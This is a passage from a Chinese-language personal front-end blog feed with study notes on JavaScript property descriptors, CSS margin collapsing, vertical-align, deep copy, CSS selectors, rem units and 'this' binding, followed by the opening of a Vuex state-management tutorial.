<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Sequence</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.next = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Sequence.number++;</span><br><span class="line">        <span class="built_in">console</span>.log(Sequence.number);</span><br><span class="line">        <span class="keyword">return</span> Sequence.number;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Sequence, <span class="string">"number"</span>, &#123;</span><br><span class="line">    value: <span class="number">0</span>,</span><br><span class="line">    writable: <span class="literal">true</span>,</span><br><span class="line">    enumerable: <span class="literal">false</span>,</span><br><span class="line">    configurable: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="get"><a href="#get" class="headerlink" title="get"></a>get</h4><p>给属性提供 getter 的方法</p>
<h4 id="set"><a href="#set" class="headerlink" title="set"></a>set</h4><p>给属性提供 setter的方法，该方法将接受唯一参数，并将该参数的新值分配给该属性。</p>
<h4 id="数据描述符"><a href="#数据描述符" class="headerlink" title="数据描述符"></a>数据描述符</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">"demo"</span>, &#123;</span><br><span class="line">  configurable: <span class="literal">true</span>,</span><br><span class="line">  enumerable: <span class="literal">true</span>,</span><br><span class="line">  writable: <span class="literal">true</span>,</span><br><span class="line">  value: <span class="number">666</span> <span class="comment">//数据描述符</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="存取描述符"><a href="#存取描述符" class="headerlink" title="存取描述符"></a>存取描述符</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> temp;</span><br><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(obj, <span class="string">'demo'</span>, &#123;</span><br><span class="line">  configurable: <span class="literal">true</span>,</span><br><span class="line">  enumerable: <span class="literal">true</span>,</span><br><span class="line">  <span class="keyword">get</span>: function()&#123;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="keyword">set</span>: function(new)&#123;</span><br><span class="line">    temp = <span class="keyword">new</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/defineProperty" target="_blank" rel="noopener">MDN web docs</a></p>
<h2 id="margin的垂直重叠"><a href="#margin的垂直重叠" class="headerlink" title="margin的垂直重叠"></a>margin的垂直重叠</h2><p><strong>两个或多个相邻的普通流中的块元素垂直方向上的 margin 会折叠</strong></p>
<h3 id="两个或多个"><a href="#两个或多个" class="headerlink" title="两个或多个"></a>两个或多个</h3><p>需要两个或两个以上的元素参与的行为，且折叠是相互行为，不存在 A 和 B 折叠，B 没有和 A 折叠的现象。</p>
<h3 id="相邻"><a href="#相邻" class="headerlink" title="相邻"></a>相邻</h3><h4 id="兄弟同级相邻"><a href="#兄弟同级相邻" class="headerlink" title="兄弟同级相邻"></a>兄弟同级相邻</h4><p>两个元素时兄弟，且二者之间没有其他元素：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'margin-bottom:20px'</span>&gt;</span>兄<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'margin-top:10px'</span>&gt;</span>弟<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时二者的间距为20px，产生重叠；</p>
<p>若兄弟间有其他元素，则不会产生重叠，二者间距30px；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'margin-bottom:20px'</span>&gt;</span>兄<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">span</span>&gt;</span>第三者<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'margin-top:10px'</span>&gt;</span>弟<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h4 id="父子相邻"><a href="#父子相邻" class="headerlink" title="父子相邻"></a>父子相邻</h4><p>父子之间的<code>margin-top</code>相邻或<code>margin-bottom</code>相邻；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'margin-bottom:20px'</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span>&gt;</span>111<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">'margin-bottom:10px'</span>&gt;</span>子<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>NEXT<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>此时父级的<code>margin-bottom</code>与子级的<code>margin-bottom</code>相邻，产生重叠，对于父级外界而言，只取<code>margin-bottom</code>最大值，即20px；</p>
<h4 id="其他相邻"><a href="#其他相邻" class="headerlink" title="其他相邻"></a>其他相邻</h4><p>其实只要满足上下相邻，中间没有其他元素皆可。</p>
<h3 id="普通流"><a href="#普通流" class="headerlink" title="普通流"></a>普通流</h3><p>相邻的浮动、<code>inline-block</code>、<code>absolute</code>定位的元素垂直方向的<code>margin</code>不会发生重叠；</p>
<h3 id="块元素"><a href="#块元素" class="headerlink" title="块元素"></a>块元素</h3><p>内联元素不可设置宽高和<code>margin</code>。</p>
<h3 id="垂直方向"><a href="#垂直方向" class="headerlink" title="垂直方向"></a>垂直方向</h3><p>只有在垂直方向才会发生重叠，水平方向不会。</p>
<h3 id="margin重叠有什么意义"><a href="#margin重叠有什么意义" class="headerlink" title="margin重叠有什么意义"></a>margin重叠有什么意义</h3><p>看起来有点奇怪的规则，其实有其现实意义。比如在我们使用<code>p</code>元素排版段落时，<code>p</code>元素默认外边距是16px，上下两个<code>p</code>元素不会产生中间间隔32px的现象；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>1111<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>2222<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h3 id="如何使margin垂直方向不重叠"><a href="#如何使margin垂直方向不重叠" class="headerlink" title="如何使margin垂直方向不重叠"></a>如何使margin垂直方向不重叠</h3><ul>
<li>使用padding代替；</li>
<li>设置父级元素overflow: hidden/auto；</li>
<li>设置二者之一的元素<code>display: inline-block</code>；</li>
<li>设置元素浮动或者绝对定位；</li>
</ul>
<p>注：并不是所有的BFC都可以使margin垂直方向不重叠，设置overflow、display、浮动和绝对定位只是BFC的子集；</p>
<h2 id="字的基线与vertical-align"><a href="#字的基线与vertical-align" class="headerlink" title="字的基线与vertical-align"></a>字的基线与vertical-align</h2><h3 id="字的基线"><a href="#字的基线" class="headerlink" title="字的基线"></a>字的基线</h3><blockquote>
<p><a href="https://blog.csdn.net/it_queen/article/details/54729949" target="_blank" rel="noopener">CSDN文章</a></p>
</blockquote>
<p><img src="http://static.simmzl.cn/blog/180914/lbmbmjF30f.png?imageslim" alt="mark"></p>
<h3 id="vertical-align"><a href="#vertical-align" class="headerlink" title="vertical-align"></a>vertical-align</h3><blockquote>
<p><a href="http://www.w3school.com.cn/cssref/pr_pos_vertical-align.asp" target="_blank" rel="noopener">定义</a></p>
</blockquote>
<h4 id="默认基线对齐baseline"><a href="#默认基线对齐baseline" class="headerlink" title="默认基线对齐baseline"></a>默认基线对齐baseline</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>aghGi<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"img-sm"</span> <span class="attr">src</span>=<span class="string">"https://simmzl.cn/v2.0/img/icon.png"</span> <span class="attr">width</span>=<span class="string">100px;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://simmzl.cn/v2.0/img/icon.png"</span> <span class="attr">width</span>=<span class="string">200px;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ffd800</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">36px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>默认基线对齐：</p>
<p><img src="http://static.simmzl.cn/blog/180914/lhKi19H0mh.png?imageslim" alt="mark"></p>
<h4 id="Top"><a href="#Top" class="headerlink" title="Top"></a>Top</h4><p>把元素的顶端与其他行中最高元素的顶端对齐</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.img-sm</span> &#123;</span><br><span class="line">    <span class="attribute">vertical-align</span>: top;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<p><img src="http://static.simmzl.cn/blog/180914/4A1kElf7GI.png?imageslim" alt="mark"></p>
<h4 id="Bottom"><a href="#Bottom" class="headerlink" title="Bottom"></a>Bottom</h4><p>把元素的顶端与其他行中最低的元素的顶端对齐</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">vertical-align</span>: bottom;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<p><img src="http://static.simmzl.cn/blog/180914/LJCJC5Af9A.png?imageslim" alt="mark"></p>
<h4 id="Middle"><a href="#Middle" class="headerlink" title="Middle"></a>Middle</h4><p>把元素的中部和父元素字体的中线对齐</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">    Father-gjly</span><br><span class="line">    <span class="tag">&lt;<span class="name">span</span>&gt;</span>aghGi<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">class</span>=<span class="string">"img-sm"</span> <span class="attr">src</span>=<span class="string">"https://simmzl.cn/v2.0/img/icon.png"</span> <span class="attr">width</span>=<span class="string">100px;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"https://simmzl.cn/v2.0/img/icon.png"</span> <span class="attr">width</span>=<span class="string">200px;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">div</span> &#123;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">20px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#ffd800</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">600px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">display</span>: inline-block;</span><br><span class="line">    font-size: 16px;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">    <span class="attribute">color</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">36px</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.img-sm</span> &#123;</span><br><span class="line">    <span class="attribute">vertical-align</span>: middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>效果：</p>
<p><img src="http://static.simmzl.cn/blog/180914/hbCGLK6813.png?imageslim" alt="mark"></p>
<h4 id="text-top-amp-text-bottom"><a href="#text-top-amp-text-bottom" class="headerlink" title="text-top &amp; text-bottom"></a>text-top &amp; text-bottom</h4><p>把元素的顶端与父元素字体的顶端对齐 &amp; 把元素的底端与父元素字体的底端对齐</p>
<p>text-top:</p>
<p><img src="http://static.simmzl.cn/blog/180914/e8cEFAd1H0.png?imageslim" alt="mark"></p>
<p>text-bottom:</p>
<p><img src="http://static.simmzl.cn/blog/180914/fg8fFiBAI3.png?imageslim" alt="mark"></p>
<h4 id="百分比或者长度"><a href="#百分比或者长度" class="headerlink" title="百分比或者长度"></a>百分比或者长度</h4><ul>
<li>%: 使用 “line-height” 属性的百分比值来排列此元素。允许使用负值，需要设置line-height;</li>
<li>长度：正负px;</li>
</ul>
<p>以上两种只会让元素在父元素内上下移动，向上最多到父元素顶部，向下则可以出父元素</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/* 基于默认基线处上移33px和img-sm居中对齐（不精确） */</span></span><br><span class="line"><span class="selector-tag">span</span> &#123;</span><br><span class="line">    <span class="attribute">vertical-align</span>: <span class="number">33px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="http://static.simmzl.cn/blog/180914/6GjDIfKEak.png?imageslim" alt="mark"></p>
<h2 id="深拷贝与浅拷贝"><a href="#深拷贝与浅拷贝" class="headerlink" title="深拷贝与浅拷贝"></a>深拷贝与浅拷贝</h2><p>讲的很好：<br><a href="https://www.cnblogs.com/echolun/p/7889848.html" target="_blank" rel="noopener">深拷贝与浅拷贝的区别，实现深拷贝的几种方法</a></p>
<p>总结一下：</p>
<p>基本数据类型：number,string,boolean,null,undefined五类，<strong>无需深拷贝，直接存在栈内</strong>；<br>引用数据类型：(Object类)，有常规名值对的无序对象{a:1}，数组[1,2,3]，以及函数等。<strong>存储在栈中的是堆中的地址</strong>，浅拷贝只拷贝栈中地址，故需要深拷贝。</p>
<p>实现深拷贝：</p>
<ul>
<li>递归赋值所有层级属性</li>
<li>使用<code>JSON.stringify()</code> 和<code>JSON.prase()</code></li>
</ul>
<p>像使用<code>slice() / concat() / Object.assign()</code>等只能深拷贝一层，不是真正的深拷贝。</p>
<h2 id="未声明的变量会自动升级为全局变量的原因"><a href="#未声明的变量会自动升级为全局变量的原因" class="headerlink" title="未声明的变量会自动升级为全局变量的原因"></a>未声明的变量会自动升级为全局变量的原因</h2><p><a href="https://www.jianshu.com/p/41c2f8f6b80a" target="_blank" rel="noopener">js 严格模式下，为什么不能给未声明变量赋值</a></p>
<p>拓展：<br><a href="https://blog.csdn.net/highboys/article/details/79110116" target="_blank" rel="noopener">10分钟理解JS引擎的执行机制</a></p>
<p><a href="https://blog.csdn.net/liaodehong/article/details/50488098" target="_blank" rel="noopener">JavaScript运行原理解析</a></p>
<h2 id="gt"><a href="#gt" class="headerlink" title="~ &gt; +"></a>~ &gt; +</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>pppppp<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>3<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>4<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line">p~h1 &#123;</span><br><span class="line">    color: yellow;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>p~h1</code>选择和<code>p</code>元素父级相同，在<code>p</code>元素之后的元素，所以<code>color</code>为<code>yellow</code>的是 <code>2 3</code>；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"foo"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h1</span>&gt;</span>1<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>2<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.foo &gt; h1 &#123;</span><br><span class="line">    color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>.foo &gt; h1</code>选择的是<code>.foo</code>内的所有元素，但只选择一代，所有只有 <code>1</code> 才显示为红色；  </p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"foo"</span>&gt;</span>11<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"boo"</span>&gt;</span>22<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"boo"</span>&gt;</span>33<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">.foo + .boo &#123;</span><br><span class="line">    color: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>.foo + .boo</code>选择的是<code>.foo</code>之后<strong>紧邻且同级</strong>的<code>.boo</code>元素。所以红色的为<code>22</code>，<code>33</code>并不会变红。</p>
<h2 id="使用rem设置元素宽高在chrome中的问题"><a href="#使用rem设置元素宽高在chrome中的问题" class="headerlink" title="使用rem设置元素宽高在chrome中的问题"></a>使用rem设置元素宽高在chrome中的问题</h2><p>rem是相对于html根节点的长度单位。在使用rem替代px时，常设置：<code>html: { font-size: 62.5% }</code>, 16px为默认字体大小，<code>1rem = 62.5% * 16px = 10px</code>，方便计算，所以24px可以表示为2.4rem，即<code>2.4 * 62.5% * 16px = 24px</code>。<br><strong>但在chrome中由于浏览器默认最小字体为12px，所以导致<code>1rem = 12px</code></strong>,<code>width:10rem</code>渲染出来是<code>width:120px</code>，报道出了偏差…  </p>
<h3 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h3><p>为了避免出现10px被设置为12px的问题，可将 62.5% 改为 625%，则<code>1rem = 625% * 16px = 100px</code>:  </p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">html</span>: &#123;</span><br><span class="line">    <span class="attribute">font-size</span>: <span class="number">625%</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>100px可表示为1rem， 24px可表示为.24rem</p>
<h2 id="小题"><a href="#小题" class="headerlink" title="小题"></a>小题</h2><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;</span><br><span class="line">    age: <span class="number">20</span>,</span><br><span class="line">    getAge: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> <span class="keyword">this</span>.age; &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123; <span class="attr">age</span>: <span class="number">30</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> getAge = obj1.getAge;</span><br><span class="line">obj2.getAge = getAge;</span><br><span class="line"><span class="built_in">console</span>.log(obj1.getAge()); <span class="comment">// 20</span></span><br><span class="line"><span class="built_in">console</span>.log(obj2.getAge()); <span class="comment">// 30</span></span><br></pre></td></tr></table></figure>
<p>这涉及到<strong>this的引用</strong></p>
<ul>
<li><p>this是函数内部的一个特殊对象（或this引用）–它引用的是函数据以执行的环境对象。（来源于JavaScript高级程序设计）</p>
</li>
<li><p>this引用是一种在JavaScript的代码中随时都可以使用的只读变量。 this引用，引用（指向）的是一个对象，<strong>它有着会根据代码上下文语境自动改变其引用对象的特性</strong>。</p>
</li>
<li>JavaScript是动态语言，<strong>this关键字在执行的时候才能确定是谁</strong>，所以this永远指向调用者，即对“调用对象”的引用。简单点说就是 <strong>调用的方法属于哪个对象，this就指向那个对象。根据函数调用方式的不同，this可以 指向全局对象，当前对象，或其他任意对象。<a href="https://blog.simmzl.cn/2017/10/%E5%87%BD%E6%95%B0%E7%9A%84%E4%B8%A4%E4%B8%AA%E9%99%84%E5%8A%A0%E5%8F%82%E6%95%B0%EF%BC%9Athis%E5%92%8Carguments.html">this四个调用模式</a></strong></li>
</ul>
<p>因此，this只有在被调用时才确定指向，<code>console.log(obj2.getAge())</code> 的结果是<code>obj2.age</code>，即30。</p>
<p><strong>拓展：</strong></p>
<p>动态语言：是指程序在运行时可以改变其结构：新的函数可以被引进，已有的函数可以被删除等在结构上的变化，类型的检查是在运行时做的，优点为方便阅读，清晰明了，缺点为不方便调试。如JavaScript；</p>
<p>静态语言：静态类型语言的类型判断是在运行前判断（如编译阶段），比如C#、java。</p>
]]></content>
      <categories>
        <category>Notes</category>
      </categories>
      <tags>
        <tag>js</tag>
        <tag>Q&amp;A</tag>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>Vuex &amp; Redux - Vuex</title>
    <url>/2019/06/Vuex&amp;Redux-Vuex.html</url>
    <content><![CDATA[<h1 id="状态管理模式"><a href="#状态管理模式" class="headerlink" title="状态管理模式"></a>状态管理模式</h1><p>在单页应用的开发中，Vue全家桶的Vuex和React全家桶的Redux都是统一的状态管理工具/模式。它们是全局的，简单来说，就是在state中定义一个数据，就可以在整个项目中获取、修改，并且修改会得到全局的响应变更；</p>
<p>这些状态管理工具适用于中大型项目，在小型项目会使得项目变得繁杂；</p>
<a id="more"></a>
<h1 id="Vuex架构"><a href="#Vuex架构" class="headerlink" title="Vuex架构"></a>Vuex架构</h1><p>先上一张Vuex官网的架构图：</p>
<p><img src="https://static.simmzl.cn/img/vuex.png" alt="vuex"></p>
<h2 id="常见的目录结构"><a href="#常见的目录结构" class="headerlink" title="常见的目录结构"></a>常见的目录结构</h2><ul>
<li>src<ul>
<li>store<ul>
<li>modules    // 模块定义store<ul>
<li>module.js // 单个模块</li>
</ul>
</li>
<li>index.js   // 用于引入各个单一模块，new一个store</li>
<li>types.js   // 定义常量</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="State"><a href="#State" class="headerlink" title="State"></a>State</h2><p>Vuex使用的是单一状态树，即state是一个对象，包含了所有定义的数据。</p>
<p>在单一的模块module.js中，我们可以这样定义一个数据：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> person = &#123;</span><br><span class="line">    state: &#123;</span><br><span class="line">        name: <span class="string">"tom"</span>,</span><br><span class="line">        age: <span class="number">20</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> person;</span><br></pre></td></tr></table></figure>
<p>然后由index.js统一引入，实例化一个新的store：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> Vuex <span class="keyword">from</span> <span class="string">"vuex"</span>;</span><br><span class="line"><span class="keyword">import</span> person <span class="keyword">from</span> <span class="string">"@/store/modules/module"</span>;</span><br><span class="line"></span><br><span class="line">Vue.use(Vuex);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> store = <span class="keyword">new</span> Vuex.Store(&#123;</span><br><span class="line">    modules: &#123;</span><br><span class="line">        person</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> store;</span><br></pre></td></tr></table></figure>
<p>最后在main.js中注入全局：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Vue <span class="keyword">from</span> <span class="string">"vue"</span>;</span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">"@/store"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Vue(&#123;</span><br><span class="line">    store</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h3 id="state值获取-amp-mapState"><a href="#state值获取-amp-mapState" class="headerlink" title="state值获取 &amp; mapState"></a>state值获取 &amp; mapState</h3><p>我们需要person的信息时，使用<code>this.$store.state.person</code>即可获取。</p>
<p>单当统一组件多次需要person、person1的信息时，这时候使用<strong>mapState函数</strong>就很很方便。其中mapState中的函数接收的参数是<strong>该模块局部状态对象state</strong>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// vuex自带的mapState api</span></span><br><span class="line"><span class="keyword">import</span> &#123; mapState &#125; <span class="keyword">from</span> <span class="string">"vuex"</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    computed: &#123;</span><br><span class="line">        getTest() &#123; <span class="keyword">return</span> <span class="string">"test"</span> &#125;,</span><br><span class="line"></span><br><span class="line">        mapState(&#123;</span><br><span class="line">            <span class="comment">// 箭头函数可使代码更简练</span></span><br><span class="line">            person: <span class="function"><span class="params">state</span> =&gt;</span> state.person,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 传字符串参数 'person' 等同于 `state =&gt; state.person`</span></span><br><span class="line">            personAlias: <span class="string">'person'</span>,</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 为了能够使用 `this` 获取局部状态，必须使用常规函数</span></span><br><span class="line">            personName(state) &#123;</span><br><span class="line">                <span class="keyword">return</span> state.person.name + <span class="keyword">this</span>.localPerson.name</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对象展开运算符更方便</span></span><br><span class="line">        <span class="comment">// ...mapState(&#123;</span></span><br><span class="line">        <span class="comment">//     person: state =&gt; state.person</span></span><br><span class="line">        <span class="comment">// &#125;)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 对象展开运算符加名称缩写究极方便</span></span><br><span class="line">        <span class="comment">// ...mapState([</span></span><br><span class="line">        <span class="comment">//     "person"</span></span><br><span class="line">        <span class="comment">// ])</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Getters"><a href="#Getters" class="headerlink" title="Getters"></a>Getters</h2><p>有时候我们不仅仅需要state的值，多个组件需要这个值的衍生值，如将数值由人民币换算成美元，这时候就是getter出场的时候了，这一点它有点类似compute，getters返回值会根据它的依赖被缓存起来，且只有当它的依赖值发生了改变才会被重新计算。</p>
